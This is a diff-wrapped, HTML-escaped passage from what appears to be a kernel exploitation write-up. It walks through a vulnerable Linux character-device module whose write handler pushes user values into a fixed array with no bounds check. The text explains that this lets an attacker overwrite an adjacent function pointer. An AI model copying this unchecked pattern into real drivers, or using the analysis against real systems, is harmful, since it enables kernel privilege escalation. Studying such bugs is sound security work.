+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((cl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class_create&lt;/span&gt;(THIS_MODULE, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chardrv&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unregister_chrdev_region&lt;/span&gt;(first, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;device_create&lt;/span&gt;(cl, NULL, first, NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tostring&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring error&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;class_destroy&lt;/span&gt;(cl);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unregister_chrdev_region&lt;/span&gt;(first, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;cdev_init&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;c_dev, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pugs_fops);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;cdev_add&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;c_dev, first, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;device_destroy&lt;/span&gt;(cl, first);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;class_destroy&lt;/span&gt;(cl);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unregister_chrdev_region&lt;/span&gt;(first, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;Major, Minor&amp;gt;: &amp;lt;%d, %d&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;MAJOR&lt;/span&gt;(first), &lt;span style=&#34;color:#a6e22e&#34;&gt;MINOR&lt;/span&gt;(first));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __exit &lt;span style=&#34;color:#a6e22e&#34;&gt;tostring_exit&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;/* Destructor */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;unregister_chrdev_region&lt;/span&gt;(first, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring unregistered&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;module_init&lt;/span&gt;(tostring_init);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;module_exit&lt;/span&gt;(tostring_exit);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As we can see, the init function allocates a character device at &lt;code&gt;/dev/tostring&lt;/code&gt; (with the &lt;code&gt;device_create&lt;/code&gt; function).&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;p&gt;It initialize it&amp;rsquo;s &lt;code&gt;file_operations&lt;/code&gt; struct (responsible for defining the API of the character device) to the following content:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file_operations pugs_fops &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .owner &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; THIS_MODULE,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .open &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_open,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .release &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_close,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .read &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_read,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  .write &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_write
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This means that using &lt;code&gt;open/close/read/write&lt;/code&gt; syscalls on the &lt;code&gt;/dev/tostring&lt;/code&gt; character device will make the kernel call the fops struct functions. Here is the entry point for the LKM.&lt;/p&gt;
+&lt;p&gt;Thus we know that if a bug resides in the LKM, it is likely to be triggered by this interface (more complex LKMs would eventually require to interact with other kernel components in order to exploit)&lt;/p&gt;
+&lt;h3 id=&#34;char-device-interface-analysis&#34;&gt;Char device interface analysis&lt;/h3&gt;
+&lt;p&gt;The &lt;code&gt;tostring_open&lt;/code&gt; and &lt;code&gt; tostring_close&lt;/code&gt; functions are dummy functions that only prints a message (it could initiliaze data structures or stuff related to the LKM logic). Here it is mostly to comply with the &amp;ldquo;Everything is a file&amp;rdquo; linux phylosophy, where userspace programs will open/close the file (our character device) before/after interacting with it using read/write.&lt;/p&gt;
+&lt;p&gt;Both read and write primitives internally uses the following C struct:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; tostring_s {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pointer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tostring_stack[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;ssize_t&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tostring_read)(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; __user &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;loff_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;off); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It holds a memory area to store integers to convert (&lt;code&gt;tostring_stack&lt;/code&gt;), an integer &lt;code&gt;pointer&lt;/code&gt; to the internal struct stack memory, and a function pointer to the reading primitive function (&lt;code&gt;tostring_read&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;One could notice that storing data related to control flow alongside working data memory is not a good practice.&lt;/em&gt;&lt;/p&gt;
+&lt;h4 id=&#34;writing-to-char-device&#34;&gt;Writing to char device&lt;/h4&gt;
+&lt;p&gt;The &lt;code&gt;tostring_write&lt;/code&gt; function has a double logic based on the first character of the supplied buffer (argument &lt;code&gt;buf&lt;/code&gt;). It can either modify the string reading logic of the LKM, or add data to the internal &lt;code&gt;tostring_s&lt;/code&gt; struct.&lt;/p&gt;
+&lt;p&gt;It first copy data from userspace to kernel space (this is classical behavior to avoid using the userspace memory pointers directly)&lt;/p&gt;
+&lt;p&gt;Then it analyze the first character of the input buffer. If the first character is a &lt;code&gt;M&lt;/code&gt; it analyze the second character. If it&amp;rsquo;s a &lt;code&gt;H&lt;/code&gt; it set the internal reading primitive to &lt;code&gt;tostring_read_hexa&lt;/code&gt;, and set it to &lt;code&gt;tostring_read_dec&lt;/code&gt; if second char is a &lt;code&gt;D&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Otherwise, it copies the first bytes (8 bytes on a 64bits machine) of the buffer to the internal &lt;code&gt;tostring_s&lt;/code&gt; stack memory without any checks on the maximal size of this field.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;This typically allows an attacker to overwrite data which are located just after the internal stack in memory&lt;/strong&gt; &lt;em&gt;(here the &lt;code&gt;tostring_read&lt;/code&gt; function pointer)&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ssize_t&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tostring_write&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; __user &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf,&lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;loff_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;off)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bufk;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring: write()&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// rajout du 0 final
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  bufk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kmalloc&lt;/span&gt;(len &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, GFP_DMA);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bufk){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;copy_from_user&lt;/span&gt;(bufk, buf, len))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;EFAULT;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bufk[len] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bufk[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bufk[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;H&amp;#39;&lt;/span&gt;) tostring.tostring_read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_read_hexa;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bufk[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;) tostring.tostring_read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tostring_read_dec;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tostring: insertion %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) bufk));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      tostring.tostring_stack[tostring.pointer&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) bufk);;      
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;kfree&lt;/span&gt;(bufk);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; len;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;reading-from-char-device&#34;&gt;Reading from char device&lt;/h4&gt;
+&lt;p&gt;On ther other hand, the reading function just calls the &lt;code&gt;tostring_read&lt;/code&gt; function stored in the internal &lt;code&gt;tostring_s&lt;/code&gt; struct, which should fill the input buffer with either a decimal or hexadecimal string representing the top integer value of &lt;code&gt;tostring_stack&lt;/code&gt; (if not empty).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ssize_t&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tostring_read&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; __user &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;loff_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;off)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring: read()&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(tostring.tostring_read)(f, buf, len, off); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ssize_t&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tostring_read_hexa&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; __user &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;size_t&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;loff_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;off)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;printk&lt;/span&gt;(KERN_INFO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tostring: read_hexa()&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (tostring.pointer &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
